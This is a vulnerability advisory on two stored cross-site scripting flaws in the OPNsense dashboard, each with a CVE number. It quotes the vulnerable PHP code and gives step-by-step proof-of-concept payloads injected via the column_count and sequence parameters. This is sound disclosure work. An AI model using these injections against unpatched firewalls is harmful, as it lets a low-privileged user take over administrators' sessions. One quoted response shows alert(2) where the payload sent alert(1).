# Two Vulnerabilities in OPNsense

**Highest Severity Rating:** High

**Confirmed Affected Versions:** 23.1.11\_1, 23.7.3, 23.7.4

**Confirmed Patched Versions:** 23.7.5, fixed in commit 484753b2abe3fd0fcdb73d8bf00c3fc3709eb8b7

**Vendor:** Deciso B.V. / OPNsense

**Vendor URL:** <https://opnsense.org>

**Credit:** X41 D-Sec GmbH, Yasar Klawohn and JM

**Status:** Public

**Advisory-URL:** https://www.x41-dsec.de/lab/advisories/x41-2023-001-opnsense

## Summary and Impact

The OPNsense dashboard displays widgets with information about the system, running services, gateways and more. These widgets can be arranged in different orders and columns. The values for the number of columns and the order of widgets are stored server-side and are the same for all users of an OPNsense instance. They are reflected unmodified on every visit. This can be abused by a low-privileged attacker to inject their own content into the page, enabling a cross-site scripting (XSS) attack that can result in privilege escalation.

## Product Description

OPNsense is an open source, FreeBSD-based firewall and routing operating system. It includes many features of commercial firewalls and can be managed entirely via its web GUI.

# Stored XSS in the OPNsense Dashboard via the column\_count Parameter

**Severity Rating:** High

**Vector:** Network

**CVE:** CVE-2023-44275

**CWE:** 79

**CVSS Score:** 8.0

**CVSS Vector:** 3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H

**Credit:** X41 D-Sec GmbH, Yasar Klawohn

## Analysis

The number of columns displayed in the dashboard is set via an HTTP POST request to `/index.php`, using the `column_count` request parameter. This parameter is not properly escaped when returned to the client. To exploit this issue, the payload `"><script>alert(1)</script>` is submitted as part of the `column_count` parameter. This input is reflected unmodified in the response and on any subsequent visit to the dashboard by any user. Only the âLobby: Login / Logout / Dashboardâ permission is required to abuse this issue.

Once the server receives the POST request, the `column_count` parameter is [written unmodified into the configuration](https://github.com/opnsense/core/blob/2306449329e462364c07317b23a1f257779a4fc8/src/www/index.php#L66-L79):

```
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['origin'])
            && $_POST['origin'] == 'dashboard') {
    // ...
    if (!empty($_POST['column_count'])) {
        $config['widgets']['column_count'] = $_POST['column_count'];
    } elseif(isset($config['widgets']['column_count'])) {
        unset($config['widgets']['column_count']);
    }
    write_config('Widget configuration has been changed');
    header(url_safe('Location: /index.php'));
    exit;
}

```

If the `column_count` parameter is not empty, it is [used unmodified](https://github.com/opnsense/core/blob/2306449329e462364c07317b23a1f257779a4fc8/src/www/index.php#L42):

```
// ...
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $pconfig = $config['widgets'];
    // ...
    $pconfig['column_count'] =
       !empty($pconfig['column_count']) ? $pconfig['column_count'] : 2;
    // ...

```

Below, the [unmodified value is written](https://github.com/opnsense/core/blob/2306449329e462364c07317b23a1f257779a4fc8/src/www/index.php#L332):

```
// ...
<section class="page-content-main">
  <form method="post" id="iform">
    <input type="hidden" value="dashboard" name="origin" id="origin" />
    <input type="hidden" value="" name="sequence" id="sequence" />
    <input type="hidden" value="<?= $pconfig['column_count'];?>"
        name="column_count" id="column_count_input" />
  </form>
// ...

```
## Proof of Concept

Log in as root. On the left side, go to System -> Access -> Users, and add a new user. For âEffective Privilegesâ, only select âLobby: Login / Logout / Dashboardâ. The user is now only able to view the dashboard and the help pages.

Log in as that newly created user and open your browserâs network monitor. In the OPNsense dashboard, select â1 columnâ from the top right and then press âsave settingsâ.

Repeat the POST request and replace the `column_count` variable with

```
column_count=1"><script>alert(1)</script>

```

Now, log in as admin again, you should see an alert box resulting from the following HTML response:

```
<form method="post" id="iform">
    <!-- .. -->
    <input type="hidden" value="1">
        <script>alert(1)</script>"
        name="column_count" id="column_count_input" />
</form>

```

This is the stored XSS and can result in privilege escalation.

The OPNsense developers did apply a Content-Security-Policy, but unfortunately allow `unsafe-inline` and `unsafe-eval` for scripts, which does not prevent the exploitation of this vulnerability.

# Stored XSS in the OPNsense Dashboard via the sequence Parameter

**Severity Rating:** High

**Vector:** Network

**CVE:** CVE-2023-44276

**CWE:** 79

**CVSS Score:** 8.0

## Analysis

The order in which the widgets are displayed in the Dashboard is set via an HTTP POST request to `/index.php`, using the `sequence` request parameter. This parameter is not properly escaped when returned to the client. To exploit this issue, the payload `"><script>alert(1)</script>` is submitted as part of the `sequence` parameter. This input is reflected unmodified in the response and on any subsequent visit to the dashboard by any user. Only the âLobby: Login / Logout / Dashboardâ permission is required to abuse this issue.

The order in which widgets are displayed on the dashboard can be set in the same POST request, via the `sequence` parameter. The sequence parameter has the following format:

```
sequence=services_status-container:00000000-col3:show,
    interface_list-container:00000001-col4:show,
    gateways-container:00000002-col4:show

```

Once the server receives the POST request, the `sequence` parameter is [written unmodified into the configuration](https://github.com/opnsense/core/blob/cbaf7cee1f0a6fabd1ec4c752a5d169c402976dc/src/www/index.php#L66-L80):

```
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['origin'])
            && $_POST['origin'] == 'dashboard') {
    if (!empty($_POST['sequence'])) {
        $config['widgets']['sequence'] = $_POST['sequence'];
    } elseif (isset($config['widgets']['sequence'])) {
        unset($config['widgets']['sequence']);
    }
    // ...
    write_config('Widget configuration has been changed');
    header(url_safe('Location: /index.php'));
    exit;
}

```

When serving a GET request, the `sequence` parameter is [returned unmodified](https://github.com/opnsense/core/blob/2306449329e462364c07317b23a1f257779a4fc8/src/www/index.php#L39-L41), starting with a read of its value from the configuration:

```
// ...
$pconfig = $config['widgets'];
// set default dashboard view
$pconfig['sequence'] = !empty($pconfig['sequence']) ?
    $pconfig['sequence'] : '';
// ...

```

`sequence` [is then](https://github.com/opnsense/core/blob/2306449329e462364c07317b23a1f257779a4fc8/src/www/index.php#L44-L65) split by comma and further split by colon into `name`, `sortKey`, and `state`. The list of widgets is sorted on the server side using the `sortKey`.

```
$widgetSeqParts = explode(",", $pconfig['sequence']);
foreach (glob('/usr/local/www/widgets/widgets/*.widget.php') as $php_file) {
    $widgetItem = array();
    // [...]
    foreach ($widgetSeqParts as $seqPart) {
        $tmp = explode(':', $seqPart);
        if (count($tmp) == 3 &&
            explode('-', $tmp[0])[0] == $widgetItem['name']
        ) {
            $widgetItem['state'] = $tmp[2];
            $widgetItem['sortKey'] = $tmp[1];
        }
    }
    $widgetCollection[] = $widgetItem;
}
// sort widgets
usort($widgetCollection, function ($item1, $item2) {
    return strcmp(strtolower($item1['sortKey']),
        strtolower($item2['sortKey']));
});

```

Finally, the `sortKey` [is written unescaped](https://github.com/opnsense/core/blob/2306449329e462364c07317b23a1f257779a4fc8/src/www/index.php#L374) into an HTML attribute:

```
<section
    class="widgetdiv"
    data-sortkey="<?=$widgetItem['sortKey'] ?>"
    id="<?=$widgetItem['name'];?>"
    style="display:<?=$divdisplay;?>;"
>

```
## Proof of Concept

Log in as root. On the left side, go to System -> Access -> Users, and add a new user. For âEffective Privilegesâ, only select âLobby: Login / Logout / Dashboardâ. The user is now only able to view the dashboard and the help pages.

Log in as that newly created user and open your browserâs network monitor. In the OPNsense dashboard, reorder the widgets via drag-and-drop, then press âsave settingsâ.

Repeat the POST request and replace the `sequence` variable with

```
sequence=gateways-container:1"><script>alert(1)</script>-col4:show

```

Now, log in as admin again, you should see an alert box resulting from the following HTML response:

```
<div class="container-fluid">
    <!-- ... -->
        <section class="widgetdiv" data-sortkey="1">
            <script>alert(2)</script>
            -col4" id="gateways"  style="display:block;">

```

This is the stored XSS and can result in privilege escalation.

The OPNsense developers did apply a Content-Security-Policy, but unfortunately allow `unsafe-inline` and `unsafe-eval` for scripts, which does not prevent the exploitation of this vulnerability.
